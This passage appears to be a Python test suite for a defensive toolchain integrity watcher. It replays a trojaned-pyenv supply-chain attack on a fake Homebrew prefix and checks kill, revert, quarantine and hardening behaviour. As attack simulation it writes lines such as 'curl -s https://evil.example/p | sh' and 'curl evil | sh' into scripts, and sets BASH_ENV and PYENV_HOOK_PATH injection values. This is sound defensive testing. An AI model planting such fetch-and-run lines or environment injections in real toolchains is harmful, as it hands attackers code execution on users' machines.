#!/usr/bin/env python3
"""Tests for toolchain_guard using synthetic eslogger events and real processes.

Builds a fake Homebrew prefix under a temp dir, replays the exact sequence from
the post-mortem, and checks that the script's processes are killed, pyenv is
restored, the trojan is quarantined, and allowed brew activity is accepted. Then
checks each hardening: no argv trust, pid-bound windows, symlink-safe repairs,
exec-time integrity, the event prefilter, exec and system-event rules,
credential-read alerts, stop authorization and signed webhooks.

Needs no root. Runs on macOS or Linux."""

import hashlib
import hmac
import http.server
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import toolchain_guard as tg  # noqa: E402

# Real paths, like Endpoint Security reports them (/var -> /private/var on macOS).
T = os.path.realpath(tempfile.mkdtemp(prefix="tgtest-"))
PFX = os.path.join(T, "opt/homebrew")
KEG = os.path.join(PFX, "Cellar/pyenv/2.8.0")
LIBEXEC = os.path.join(KEG, "libexec/pyenv")
BINLINK = os.path.join(PFX, "bin/pyenv")
BREW = os.path.join(PFX, "bin/brew")
RUBY = PFX + "/Library/Homebrew/vendor/ruby"
REHASH = KEG + "/libexec/pyenv-rehash"
GOOD = "#!/usr/bin/env bash\n# real pyenv\n" + "echo pyenv\n" * 300
FAILS = []
SPAWNED = []  # test processes, killed at exit (audit mode leaves some alive on purpose)
SYSTEM_DIRS = ("/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/", "/usr/libexec/")


def check(cond, msg):
    print(("PASS " if cond else "FAIL ") + msg)
    if not cond:
        FAILS.append(msg)


def sha(p):
    return hashlib.sha256(open(p, "rb").read()).hexdigest()


def alive(pid):
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    # zombies count as dead
    if os.path.isdir("/proc/self"):  # Linux
        try:
            with open(f"/proc/{pid}/stat") as f:
                return f.read().split(")")[-1].split()[0] != "Z"
        except OSError:
            return False
    # macOS has no /proc: ask ps for the process state
    st = subprocess.run(["/bin/ps", "-o", "stat=", "-p", str(pid)],
                        capture_output=True, text=True).stdout.strip()
    return bool(st) and not st.startswith("Z")


def orphan_tree():
    """Start 'bash script -> two sleeps' detached from us (reparented to pid 1),
    like a script launched by a package hook. Returns (script_pid, child1, child2)."""
    d = tempfile.mkdtemp(dir=T)
    subprocess.run(["bash", "-c", (
        f"nohup bash -c 'echo $$ > {d}/a; sleep 300 & echo $! > {d}/b; "
        f"sleep 301 & echo $! > {d}/c; wait' >/dev/null 2>&1 &")], check=True)
    for _ in range(50):
        if all(os.path.exists(f"{d}/{n}") and open(f"{d}/{n}").read().strip() for n in "abc"):
            break
        time.sleep(0.05)
    pids = tuple(int(open(f"{d}/{n}").read()) for n in "abc")
    SPAWNED.extend(pids)
    return pids


def lone_process():
    d = tempfile.mkdtemp(dir=T)
    subprocess.run(["bash", "-c", f"nohup sleep 302 >/dev/null 2>&1 & echo $! > {d}/p"], check=True)
    pid = int(open(f"{d}/p").read())
    SPAWNED.append(pid)
    return pid


def reap(*pids):
    for p in pids:
        try:
            os.kill(p, 9)
        except OSError:
            pass


def proc(pid, ppid, exe, euid=501, platform=None, signing_id=None, team_id=None):
    if platform is None:
        platform = exe.startswith(SYSTEM_DIRS)
    p = {"audit_token": {"pid": pid, "euid": euid}, "ppid": ppid, "executable": {"path": exe},
         "is_platform_binary": platform}
    if signing_id:
        p["signing_id"] = signing_id
    if team_id:
        p["team_id"] = team_id
    return p


def ev(name, payload, pid, ppid, exe, euid=501, **kw):
    return {"event_type": 0, "process": proc(pid, ppid, exe, euid, **kw), "event": {name: payload}}


def exec_ev(pid, ppid, exe, args, script=None, env=None, parent_exe="/bin/zsh", **kw):
    payload = {"target": proc(pid, ppid, exe, **kw), "args": args,
               "script": {"path": script} if script else None}
    if env is not None:
        payload["env"] = env
    return ev("exec", payload, pid, ppid, parent_exe)


def fobj(path):
    return {"path": path, "stat": {"st_size": 1}}


def newp(path):
    return {"dir": fobj(os.path.dirname(path)), "filename": os.path.basename(path), "mode": 420}


def write_rules(mode="enforce", extra_rules=(), settings=None, name=None):
    s = {"mode": mode, "home_dir": os.path.join(T, "guard"),
         "log_file": os.path.join(T, "guard.jsonl"), "scan_interval_seconds": 9999,
         "heartbeat_seconds": 9999, "rebaseline_settle_seconds": 0, "syslog": False}
    s.update(settings or {})
    rules = {
        "settings": s,
        "rules": [{
            "id": "homebrew-toolchain", "severity": "critical",
            "paths": [os.path.join(PFX, d) for d in ("Cellar", "bin", "opt", "lib", "Library")],
            "exclude": [os.path.join(PFX, "lib/node_modules*")],
            "allow": {"ancestor_paths": [BREW, os.path.join(PFX, "Library/Homebrew/")],
                      "only_during_window": True},
            "actions": ["kill", "revert", "alert"], "kill_scope": "script"}] + list(extra_rules)}
    path = os.path.join(T, name or f"rules-{mode}.json")
    with open(path, "w") as f:
        json.dump(rules, f)
    return path


def build_prefix():
    if os.path.exists(PFX):
        shutil.rmtree(PFX)
    os.makedirs(os.path.dirname(LIBEXEC))
    os.makedirs(os.path.join(KEG, "bin"))
    os.makedirs(os.path.join(PFX, "bin"))
    os.makedirs(os.path.join(PFX, "lib/node_modules"))
    os.makedirs(os.path.join(PFX, "Library/Homebrew"))
    with open(LIBEXEC, "w") as f:
        f.write(GOOD)
    os.chmod(LIBEXEC, 0o755)
    with open(REHASH, "w") as f:
        f.write("#!/usr/bin/env bash\n# pyenv-rehash\n")
    os.chmod(REHASH, 0o755)
    os.symlink("../libexec/pyenv", os.path.join(KEG, "bin/pyenv"))
    os.symlink("../Cellar/pyenv/2.8.0/bin/pyenv", BINLINK)
    with open(BREW, "w") as f:
        f.write("#!/bin/bash\n")


def log_records():
    try:
        with open(os.path.join(T, "guard.jsonl")) as f:
            return [json.loads(l) for l in f if l.strip()]
    except FileNotFoundError:
        return []


def violations(rule=None):
    return [r for r in log_records() if r["type"] == "violation" and (rule is None or r["rule"] == rule)]


def fresh_guard(mode="enforce", extra_rules=(), settings=None):
    for p in ("guard", "guard.jsonl"):
        q = os.path.join(T, p)
        shutil.rmtree(q) if os.path.isdir(q) else (os.path.exists(q) and os.unlink(q))
    build_prefix()
    cfg = tg.Config(write_rules(mode, extra_rules, settings))
    g = tg.Guard(cfg)
    g.vault.baseline()
    g.procs.refresh(force=True)
    return g


def quarantined_shas():
    qdir = os.path.join(T, "guard/quarantine")
    if not os.path.isdir(qdir):
        return set()
    return {sha(os.path.join(qdir, f)) for f in os.listdir(qdir)
            if os.path.isfile(os.path.join(qdir, f)) and not os.path.islink(os.path.join(qdir, f))}


ORIG_SHA = hashlib.sha256(GOOD.encode()).hexdigest()

# ---------------------------------------------------------------- 1. the post-mortem attack
print("\n== 1. post-mortem sequence, enforce mode ==")
g = fresh_guard()
orig_sha = sha(LIBEXEC)
script, offender, sibling = orphan_tree()
zsh = lone_process()  # stands in for the `zsh` the script spawns
g.procs.refresh(force=True)
check(all(alive(p) for p in (script, offender, sibling, zsh)), "attack processes running before")

tmp = LIBEXEC + "_"
# Do what the malware did, for real, on disk...
shutil.copyfile(LIBEXEC, tmp)
with open(tmp, "a") as f:
    f.write("curl -s https://evil.example/p | sh  # injected\n")
os.unlink(LIBEXEC)
os.rename(tmp, LIBEXEC)
os.unlink(BINLINK)
os.symlink("../Cellar/pyenv/2.8.0/libexec/pyenv", BINLINK)
trojan_sha = sha(LIBEXEC)
# ...then feed the matching eslogger events, all from the offending process.
CP, RM, MV, LN = "/bin/cp", "/bin/rm", "/bin/mv", "/bin/ln"
events = [
    ev("create", {"destination_type": 1, "destination": {"new_path": newp(tmp)}}, offender, script, CP),
    ev("close", {"modified": True, "target": fobj(tmp)}, offender, script, CP),
    ev("unlink", {"target": fobj(LIBEXEC), "parent_dir": fobj(os.path.dirname(LIBEXEC))}, offender, script, RM),
    ev("rename", {"source": fobj(tmp), "destination_type": 0,
                  "destination": {"existing_file": fobj(LIBEXEC)}}, offender, script, MV),
    ev("unlink", {"target": fobj(BINLINK), "parent_dir": fobj(os.path.dirname(BINLINK))}, offender, script, RM),
    ev("create", {"destination_type": 1, "destination": {"new_path": newp(BINLINK)}}, offender, script, LN),
    ev("fork", {"child": proc(zsh, script, "/bin/zsh")}, script, 1, "/bin/bash"),
]
for e in events:
    g.handle(e)
time.sleep(0.3)
check(not alive(script), "malicious script process killed")
check(not alive(offender) and not alive(sibling), "its children killed")
check(not alive(zsh), "the zsh it spawned afterwards killed")
check(sha(LIBEXEC) == orig_sha, "libexec/pyenv restored to the original")
check(os.readlink(BINLINK) == "../Cellar/pyenv/2.8.0/bin/pyenv", "bin/pyenv symlink restored")
check(os.stat(LIBEXEC).st_mode & 0o777 == 0o755, "restored file keeps its mode")
qdir = os.path.join(T, "guard/quarantine")
check(trojan_sha in quarantined_shas(), "trojan moved to quarantine")
check(all(os.stat(os.path.join(qdir, f)).st_mode & 0o111 == 0 for f in os.listdir(qdir)
          if not os.path.islink(os.path.join(qdir, f))), "quarantined files not executable")
viol = violations()
check(len(viol) >= 1 and viol[0]["rule"] == "homebrew-toolchain", "violation alert logged")
killed = [a for r in viol for a in r["actions"] if a["action"] == "killed"]
check(killed and killed[0]["root_pid"] == script, "kill walk chose the script, not just `cp`")
check(any(c["pid"] == script for c in viol[0]["process_chain"]), "alert carries the process chain")
check(not os.path.exists(tmp), "no stray pyenv_ left behind")
check(any(r.get("followup") for r in viol[1:]), "later events from the killed script are marked followup")

# ---------------------------------------------------------------- 2. audit mode changes nothing
print("\n== 2. audit mode ==")
g = fresh_guard(mode="audit")
script, offender, sibling = orphan_tree()
g.procs.refresh(force=True)
with open(LIBEXEC, "a") as f:
    f.write("# tampered\n")
tampered = sha(LIBEXEC)
g.handle(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, offender, script, "/bin/bash"))
time.sleep(0.2)
check(alive(script) and alive(offender), "audit mode does not kill")
check(sha(LIBEXEC) == tampered, "audit mode does not revert")
acts = [a["action"] for r in violations() for a in r["actions"]]
check("would_kill" in acts and "would_revert" in acts, "audit alert says what it would do")
reap(script, offender, sibling)


def brew_tree(g, wrapper=None):
    """A brew process chain: [wrapper ->] brew (bash running bin/brew) -> ruby."""
    brew_pid, ruby_pid, _ = orphan_tree()
    g.procs.refresh(force=True)
    parent = wrapper or 1
    g.handle(exec_ev(brew_pid, parent, "/bin/bash", ["/bin/bash", BREW, "upgrade", "pyenv"], script=BREW))
    g.handle(exec_ev(ruby_pid, brew_pid, RUBY, ["ruby", "brew.rb"], parent_exe="/bin/bash"))
    return brew_pid, ruby_pid


# ---------------------------------------------------------------- 3. brew in a maintenance window
print("\n== 3. brew during a maintenance window ==")
g = fresh_guard()
brew_pid, ruby_pid = brew_tree(g)
newkeg = os.path.join(PFX, "Cellar/pyenv/2.9.0/libexec/pyenv")
os.makedirs(os.path.dirname(newkeg))
with open(newkeg, "w") as f:
    f.write(GOOD + "# 2.9.0\n")
create_new = ev("create", {"destination_type": 1, "destination": {"new_path": newp(newkeg)}},
                ruby_pid, brew_pid, RUBY)
g.handle(create_new)
check(not os.path.exists(newkeg), "outside a window, even brew's write is reverted (quarantined)")
check(not alive(ruby_pid), "...and its process killed")
reap(brew_pid)

g = fresh_guard()
tg.write_control(g.cfg, "window.json", {"until": time.time() + 600})
g.tick()
brew_pid, ruby_pid = brew_tree(g)
os.makedirs(os.path.dirname(newkeg))
with open(newkeg, "w") as f:
    f.write(GOOD + "# 2.9.0\n")
g.handle(create_new)
check(os.path.exists(newkeg) and alive(ruby_pid), "inside a window, brew's write is allowed")
# a non-brew process during the same window is still stopped
evil, evil_child, _ = orphan_tree()
g.procs.refresh(force=True)
with open(LIBEXEC, "a") as f:
    f.write("# sneaky\n")
g.handle(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, evil_child, evil, "/bin/bash"))
time.sleep(0.2)
check("# sneaky" not in open(LIBEXEC).read(), "non-brew write during the window is still reverted")
check(not alive(evil), "non-brew process during the window is still killed")
tg.write_control(g.cfg, "window.json", {"until": 0})
g.tick()  # window closed -> accept what brew touched
check(newkeg in g.vault.entries, "closing the window accepts brew's new files")
reb = [r for r in log_records() if r.get("type") == "rebaselined"]
check(bool(reb) and newkeg in reb[-1]["changes"]["added"]
      and reb[-1]["trigger"] == "maintenance window closed",
      "edit history logs the files the window accepted")
check(bool(reb) and any("brew" in c for c in reb[-1].get("accepted_by", [])),
      "edit history logs which brew command made them")
check(not g.run_scan(), "scan after the window finds no drift")
reap(brew_pid, ruby_pid)

# ---------------------------------------------------------------- 4. backstop scan
print("\n== 4. periodic scan backstop (no events at all) ==")
g = fresh_guard()
with open(LIBEXEC, "a") as f:
    f.write("# changed while the watcher was down\n")
os.unlink(BINLINK)
os.symlink("/tmp/evil", BINLINK)
stray = os.path.join(PFX, "bin/sudo")
with open(stray, "w") as f:
    f.write("#!/bin/sh\n# fake sudo that steals passwords\n")
results = g.run_scan("test")
check(sha(LIBEXEC) == tg.Vault(g.cfg).entries[LIBEXEC]["sha"] == orig_sha, "scan restored the modified file")
check(os.readlink(BINLINK) == "../Cellar/pyenv/2.8.0/bin/pyenv", "scan restored the symlink")
check(not os.path.exists(stray), "scan quarantined a new file dropped on PATH")
check(len([r for r in log_records() if r["type"] == "drift"]) == 3, "three drift alerts")
os.makedirs(os.path.join(PFX, "lib/node_modules/sometool"))
check(not g.run_scan(), "excluded paths are ignored")
shutil.rmtree(os.path.join(KEG, "libexec"))
g.run_scan("test")
check(os.path.exists(LIBEXEC) and sha(LIBEXEC) == orig_sha, "scan rebuilds a deleted directory tree")

# in-place edit of the same size with the timestamps put back (touch -r)
st0 = os.stat(LIBEXEC)
data = open(LIBEXEC).read()
with open(LIBEXEC, "r+") as f:
    f.write(data.replace("real pyenv", "evil pyenv"))
os.utime(LIBEXEC, ns=(st0.st_atime_ns, st0.st_mtime_ns))
check(os.stat(LIBEXEC).st_size == st0.st_size and os.stat(LIBEXEC).st_mtime_ns == st0.st_mtime_ns,
      "(setup) same size and mtime after the edit")
g.scans = 0  # make sure this is a fast (non-deep) scan
g.run_scan("test")
check(sha(LIBEXEC) == orig_sha, "fast scan catches a same-size edit with mtime restored (ctime check)")

os.chmod(LIBEXEC, 0o777)
g.run_scan("test")
check(os.stat(LIBEXEC).st_mode & 0o777 == 0o755, "scan puts back a changed mode")

# ---------------------------------------------------------------- 5. precise acceptance + other rules
print("\n== 5. allowed tool changes are accepted precisely; behavioral and alert-only rules ==")
shims = os.path.join(T, "pyenv-home/shims")
bindir = os.path.join(T, "home/.local/bin")
rcfile = os.path.join(T, "home/.zshrc")
extra = [
    {"id": "pyenv", "paths": [os.path.dirname(shims)],
     "allow": {"ancestor_regex": ["/Cellar/pyenv/[^/ ]+/libexec/pyenv"]},
     "actions": ["kill", "revert", "alert"]},
    {"id": "replace-executable-on-path", "paths": [bindir], "events": ["rename"],
     "rename_over_existing_only": True, "actions": ["alert", "snapshot"]},
    {"id": "shell-startup-files", "severity": "medium", "paths": [rcfile],
     "actions": ["alert", "snapshot"]},
]
for d in (shims, bindir):
    os.makedirs(d, exist_ok=True)
with open(os.path.join(shims, "python"), "w") as f:
    f.write("#!/bin/sh\nexec pyenv exec python\n")
with open(rcfile, "w") as f:
    f.write("eval \"$(pyenv init -)\"\n")
g = fresh_guard(extra_rules=extra)
rehash, rehash_child, _ = orphan_tree()
g.procs.refresh(force=True)
g.handle(exec_ev(rehash, 1, "/bin/bash", ["/bin/bash", REHASH], script=REHASH))
new_shim = os.path.join(shims, "pip")
with open(new_shim, "w") as f:
    f.write("#!/bin/sh\nexec pyenv exec pip\n")
g.handle(ev("create", {"destination_type": 1, "destination": {"new_path": newp(new_shim)}},
            rehash_child, rehash, "/bin/cp"))
with open(LIBEXEC, "a") as f:  # unrelated drift that must NOT be laundered
    f.write("# unrelated tamper\n")
g.tick()
check(new_shim in g.vault.entries, "pyenv rehash's new shim accepted (written by a platform helper it ran)")
check(alive(rehash) and alive(rehash_child) and not violations(), "legitimate pyenv rehash is left alone")
reb = [r for r in log_records() if r.get("type") == "rebaselined"]
check(bool(reb) and reb[-1]["changes"]["added"] == [new_shim]
      and reb[-1]["trigger"] == "allowed tool" and reb[-1]["accepted_by"],
      "edit history logs exactly the accepted shim and the tool behind it")
check(g.vault.entries[LIBEXEC]["sha"] == orig_sha, "unrelated drift not accepted into the baseline")
g.run_scan("test")
check(sha(LIBEXEC) == orig_sha, "unrelated drift reverted by the next scan")
reap(rehash, rehash_child)

tool = os.path.join(bindir, "mytool")
with open(tool, "w") as f:
    f.write("v1")
g.handle(ev("rename", {"source": fobj(tool + ".tmp"), "destination_type": 1,
                       "destination": {"new_path": newp(tool)}}, 4242, 1, "/usr/bin/install"))
check(not violations("replace-executable-on-path"), "rename to a NEW name on PATH is not flagged")
g.handle(ev("rename", {"source": fobj(tool + "_"), "destination_type": 0,
                       "destination": {"existing_file": fobj(tool)}}, 4242, 1, "/bin/mv"))
hits = violations("replace-executable-on-path")
check(len(hits) == 1 and any(a["action"] == "snapshot" for a in hits[0]["actions"]),
      "rename OVER an existing file on PATH alerts with a snapshot")
with open(rcfile, "a") as f:
    f.write("source ~/.cache/.x\n")
g.handle(ev("close", {"modified": True, "target": fobj(rcfile)}, 4243, 1, "/usr/bin/vim"))
rc = violations("shell-startup-files")
check(rc and rc[0]["severity"] == "medium" and "source ~/.cache/.x" in open(rcfile).read(),
      "rc-file edit alerts (snapshot) but is not reverted")
g.handle(ev("close", {"modified": True, "target": fobj(rcfile)}, 4243, 1, "/usr/bin/vim"))
check(len(violations("shell-startup-files")) == 1, "the same alert-only event is not repeated within the dedupe window")

# ---------------------------------------------------------------- 6. self-protection signals
print("\n== 6. tamper attempts against the watcher ==")
g.handle(ev("signal", {"sig": 9, "target": proc(os.getpid(), 1, "/usr/bin/python3")},
            5555, 1, "/bin/kill"))
g.handle(exec_ev(5556, 1, "/bin/launchctl", ["launchctl", "bootout", "system/com.example.toolchain-guard"]))
tam = [r for r in log_records() if r["type"] == "tamper_attempt"]
check(any("signal 9" in r["detail"] for r in tam), "SIGKILL aimed at the watcher is reported")
check(any("command aimed" in r["detail"] for r in tam), "launchctl bootout of the watcher is reported")

# ---------------------------------------------------------------- 7. CLI
print("\n== 7. CLI ==")
build_prefix()
rules = write_rules()
env_cmd = [sys.executable, os.path.join(HERE, "toolchain_guard.py"), "--rules", rules, "--allow-nonroot"]
shutil.rmtree(os.path.join(T, "guard"), ignore_errors=True)
out = subprocess.run(env_cmd + ["baseline"], capture_output=True, text=True)
check(out.returncode == 0 and "entries" in out.stdout, "baseline command")
check(subprocess.run(env_cmd + ["verify"], capture_output=True).returncode == 0, "verify: clean")
with open(LIBEXEC, "a") as f:
    f.write("# x\n")
v = subprocess.run(env_cmd + ["verify"], capture_output=True, text=True)
check(v.returncode == 1 and LIBEXEC in v.stdout, "verify: reports drift with exit code 1")
s = subprocess.run(env_cmd + ["scan"], capture_output=True, text=True)
check(s.returncode == 0 and sha(LIBEXEC) == orig_sha, "scan: repairs drift")
replay = os.path.join(T, "replay.jsonl")
with open(replay, "w") as f:
    f.write(json.dumps(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, 7777, 1, "/bin/bash")) + "\n")
with open(LIBEXEC, "a") as f:
    f.write("# y\n")
r = subprocess.run(env_cmd + ["run", "--replay", replay], capture_output=True, text=True)
check(r.returncode == 0 and sha(LIBEXEC) == orig_sha, "run --replay processes events end to end")
subprocess.run(env_cmd + ["window", "open", "5"], capture_output=True)
subprocess.run(env_cmd + ["window", "close"], capture_output=True)
win = [r for r in log_records() if r.get("type") == "window"]
check([r["state"] for r in win[-2:]] == ["open", "close"] and win[-2]["minutes"] == 5,
      "window open and close are logged")
check(win[-2].get("severity") == "medium", "a window not bound to a process is flagged as weaker")
w = subprocess.run(env_cmd + ["window", "open", "5", "--pid", "999999"], capture_output=True, text=True)
check(w.returncode != 0, "window --pid refuses a pid that is not running")
st = subprocess.run(env_cmd + ["status"], capture_output=True, text=True)
check(st.returncode == 0 and '"baseline_entries"' in st.stdout, "status command")
so = subprocess.run(env_cmd + ["stop", "--authorize-only"], capture_output=True, text=True)
check(so.returncode == 0 and os.path.exists(os.path.join(T, "guard/control/stop.json")),
      "stop --authorize-only writes the authorization")
check(oct(os.stat(os.path.join(T, "guard/control/window.json")).st_mode & 0o777) == "0o600",
      "control files are not world-readable")

# ================================================================ hardening
# ---------------------------------------------------------------- 8. no trust in argv
print("\n== 8. argv is never trusted for allow decisions ==")
g = fresh_guard(extra_rules=[extra[0]])
tg.write_control(g.cfg, "window.json", {"until": time.time() + 600})
g.tick()
spoof, spoof_child, _ = orphan_tree()
g.procs.refresh(force=True)
# `exec -a /opt/homebrew/bin/brew bash -c ...`: brew in argv, but no brew image
g.handle(exec_ev(spoof, 1, "/bin/bash", [BREW, "-c", "cp evil " + LIBEXEC]))
with open(LIBEXEC, "a") as f:
    f.write("# spoofed\n")
g.handle(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, spoof, 1, "/bin/bash"))
time.sleep(0.2)
check(sha(LIBEXEC) == orig_sha and not alive(spoof), "brew path in argv during a window does not allow a write")
# `bash -c 'cp evil shims/python' x /Cellar/pyenv/1/libexec/pyenv`, no window needed for pyenv
g.handle(exec_ev(spoof_child, 1, "/bin/bash",
                 ["bash", "-c", "cp evil shims/python", "x", KEG + "/libexec/pyenv"]))
shim_py = os.path.join(shims, "python")
good_shim = open(shim_py).read()
with open(shim_py, "w") as f:
    f.write("#!/bin/sh\ncurl evil | sh\n")
g.handle(ev("close", {"modified": True, "target": fobj(shim_py)}, spoof_child, 1, "/bin/bash"))
time.sleep(0.2)
check(open(shim_py).read() == good_shim, "pyenv path in argv does not allow a shim write")
# a process known only from ps is never trusted, whatever argv[0] says
g.procs.procs[424242] = {"ppid": 1, "oppid": None, "path": REHASH, "script": None, "args": [REHASH],
                         "euid": 501, "platform": None, "signing_id": None, "team_id": None,
                         "taint": None, "src": "ps"}
check(g._allowed(g.cfg.file_rules[1], 424242, 501) is None, "a ps-only process cannot be allowed")
reap(spoof, spoof_child)

# ---------------------------------------------------------------- 9. children of allowed tools
print("\n== 9. PATH and env injection into an allowed tool ==")
g = fresh_guard(extra_rules=[extra[0]])
rh, rh_child, rh_child2 = orphan_tree()
g.procs.refresh(force=True)
g.handle(exec_ev(rh, 1, "/bin/bash", ["/bin/bash", REHASH], script=REHASH))
fake_rm = os.path.join(T, "evil/rm")  # PATH=/tmp/evil:$PATH pyenv rehash
g.handle(exec_ev(rh_child, rh, fake_rm, ["rm", "-f", shim_py], parent_exe="/bin/bash"))
with open(shim_py, "w") as f:
    f.write("#!/bin/sh\necho owned\n")
g.handle(ev("close", {"modified": True, "target": fobj(shim_py)}, rh_child, rh, fake_rm))
time.sleep(0.2)
check(open(shim_py).read() == good_shim, "a non-platform binary run by pyenv (PATH injection) is not allowed")
reap(rh, rh_child, rh_child2)

rh, rh_child, _ = orphan_tree()
g.procs.refresh(force=True)
g.handle(exec_ev(rh, 1, "/bin/bash", ["/bin/bash", REHASH], script=REHASH,
                 env=["PATH=/usr/bin:/bin", "BASH_ENV=/tmp/evil.sh"]))
with open(shim_py, "w") as f:
    f.write("#!/bin/sh\necho owned2\n")
g.handle(ev("close", {"modified": True, "target": fobj(shim_py)}, rh, 1, "/bin/bash"))
time.sleep(0.2)
check(open(shim_py).read() == good_shim, "pyenv started with BASH_ENV (code injection) is not allowed")
check(any(c.get("taint") for r in violations("pyenv") for c in r["process_chain"]),
      "the alert names the injected variable")
reap(rh, rh_child)

# `#!/usr/bin/env bash`: the kernel attests the script on the env exec
envp, envp_c, _ = orphan_tree()
g.procs.refresh(force=True)
g.handle(exec_ev(envp, 1, "/usr/bin/env", ["/usr/bin/env", "bash", REHASH], script=REHASH))
g.handle(exec_ev(envp, 1, "/bin/bash", ["bash", REHASH], parent_exe="/usr/bin/env",
                 env=["PATH=/usr/bin:/bin", "PYENV_HOOK_PATH=" + os.path.join(T, "pyenv-home/pyenv.d")]))
new2 = os.path.join(shims, "pip3")
with open(new2, "w") as f:
    f.write("#!/bin/sh\nexec pyenv exec pip3\n")
g.handle(ev("create", {"destination_type": 1, "destination": {"new_path": newp(new2)}}, envp, 1, "/bin/bash"))
check(os.path.exists(new2) and alive(envp), "script attested on `env` carries over to the interpreter it starts")
g.handle(exec_ev(envp_c, 1, "/bin/bash", ["bash", REHASH], script=REHASH,
                 env=["PYENV_HOOK_PATH=/tmp/attacker-hooks"]))
check(g.procs.procs[envp_c]["taint"] == ["PYENV_HOOK_PATH"], "PYENV_HOOK_PATH outside protected dirs taints pyenv")
reap(envp, envp_c)

# ---------------------------------------------------------------- 10. pid-bound windows
print("\n== 10. windows bound to the wrapper's process ==")
g = fresh_guard()
wrapper = lone_process()
tg.write_control(g.cfg, "window.json", {"until": time.time() + 600, "pid": wrapper})
g.tick()
check(g.window_open(), "window bound to a live pid is open")
b_in, r_in = brew_tree(g, wrapper=wrapper)
newfile = os.path.join(PFX, "Cellar/pyenv/2.8.0/share-new")
with open(newfile, "w") as f:
    f.write("new\n")
g.handle(ev("create", {"destination_type": 1, "destination": {"new_path": newp(newfile)}}, r_in, b_in, RUBY))
check(os.path.exists(newfile), "brew started by the wrapper may write")
b_out, r_out = brew_tree(g)  # a real brew, but not started by the wrapper
other = os.path.join(PFX, "Cellar/pyenv/2.8.0/other-new")
with open(other, "w") as f:
    f.write("x\n")
g.handle(ev("create", {"destination_type": 1, "destination": {"new_path": newp(other)}}, r_out, b_out, RUBY))
time.sleep(0.2)
check(not os.path.exists(other) and not alive(r_out), "brew not started by the wrapper is stopped")
# drift nobody was seen making, while the window is open (e.g. events dropped)
with open(LIBEXEC, "a") as f:
    f.write("# unattributed\n")
reap(wrapper)
time.sleep(0.2)
g._wcache = (0.0, None, None)
g.tick()  # wrapper gone -> window closes -> accept only touched paths
check(not g.window_open(), "window closes when the wrapper process exits")
check(newfile in g.vault.entries, "files brew touched are accepted at close")
check(g.vault.entries[LIBEXEC]["sha"] == orig_sha, "unattributed change during the window is not accepted")
time.sleep(1.1)
g.tick()
check(sha(LIBEXEC) == orig_sha, "...and is reverted by the scan right after the window")
reap(b_in, r_in, b_out, r_out)

# events dropped during a window -> full acceptance, with a warning listing what it took in
g = fresh_guard()
tg.write_control(g.cfg, "window.json", {"until": time.time() + 600})
g.tick()
g.feed_line(json.dumps({"global_seq_num": 10, "event": {"fork": {}}}))
g.feed_line(json.dumps({"global_seq_num": 15, "event": {"fork": {}}}))
check(g.window_dropped and g.stats["dropped_events"] == 4, "sequence gap during a window is noticed")
unseen = os.path.join(PFX, "Cellar/pyenv/2.8.0/unseen")
with open(unseen, "w") as f:
    f.write("?\n")
tg.write_control(g.cfg, "window.json", {"until": 0})
g.tick()
warn = [r for r in log_records() if r["type"] == "warning" and "dropped during the maintenance" in r.get("detail", "")]
check(unseen in g.vault.entries and warn and unseen in warn[-1]["changes"]["added"],
      "dropped events at window close: full acceptance, and the unattributed files are reported")

# ---------------------------------------------------------------- 11. symlink attacks on the root daemon
print("\n== 11. symlink tricks cannot redirect root's repairs ==")
g = fresh_guard()
outside = os.path.join(T, "outside")
shutil.rmtree(outside, ignore_errors=True)
os.makedirs(outside)
victim = os.path.join(outside, "pyenv")
with open(victim, "w") as f:
    f.write("SECRET root-only content\n")
os.chmod(victim, 0o600)
shutil.rmtree(os.path.dirname(LIBEXEC))
os.symlink(outside, os.path.dirname(LIBEXEC))  # libexec -> /somewhere/root/owns
ev_pid = lone_process()
g.procs.refresh(force=True)
g.handle(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, ev_pid, 1, "/bin/bash"))
check(open(victim).read() == "SECRET root-only content\n" and oct(os.stat(victim).st_mode & 0o777) == "0o600",
      "a file behind a symlinked parent is not overwritten or chmodded")
check(sorted(os.listdir(outside)) == ["pyenv"], "nothing written into the symlink's target directory")
check(not os.path.islink(os.path.dirname(LIBEXEC)) and sha(LIBEXEC) == orig_sha,
      "the symlinked directory is quarantined and the real tree restored")

# leftover file at a predictable temp name pointing elsewhere (the old .tg-restore- trick)
plant = os.path.join(os.path.dirname(LIBEXEC), ".tg-restore-pyenv")
target = os.path.join(outside, "planted-target")
os.symlink(target, plant)
with open(LIBEXEC, "a") as f:
    f.write("# again\n")
g.handle(ev("close", {"modified": True, "target": fobj(LIBEXEC)}, ev_pid, 1, "/bin/bash"))
check(not os.path.exists(target) and sha(LIBEXEC) == orig_sha, "restore never writes through a planted symlink")

# hashing must not follow a symlink swapped in for an accepted file
secret = os.path.join(outside, "secret")
with open(secret, "w") as f:
    f.write("TOP SECRET\n")
link_in_tree = os.path.join(PFX, "bin/looks-like-a-tool")
os.symlink(secret, link_in_tree)
g.vault.accept([link_in_tree])
check(g.vault.entries[link_in_tree]["t"] == "l" and sha(secret) not in os.listdir(g.vault.objects),
      "accepting a symlink records the link, never copies its target into the vault")

# quarantine must not chmod a file the attacker hard-linked in from elsewhere
hl_src = os.path.join(outside, "hardlinked")
with open(hl_src, "w") as f:
    f.write("someone else's file\n")
os.chmod(hl_src, 0o644)
os.link(hl_src, os.path.join(PFX, "bin/hl"))
g.run_scan("test")
check(not os.path.exists(os.path.join(PFX, "bin/hl")) and os.stat(hl_src).st_mode & 0o777 == 0o644,
      "quarantine moves a hard link without changing the other file's mode")
reap(ev_pid)

# renaming a protected directory away and putting a symlink in its place
g = fresh_guard()
away = os.path.join(T, "moved-away")
shutil.rmtree(away, ignore_errors=True)
os.rename(os.path.dirname(LIBEXEC), away)
os.symlink(outside, os.path.dirname(LIBEXEC))
mv = lone_process()
g.procs.refresh(force=True)
g.handle(ev("rename", {"source": fobj(os.path.dirname(LIBEXEC)), "destination_type": 1,
                       "destination": {"new_path": newp(away)}}, mv, 1, "/bin/mv"))
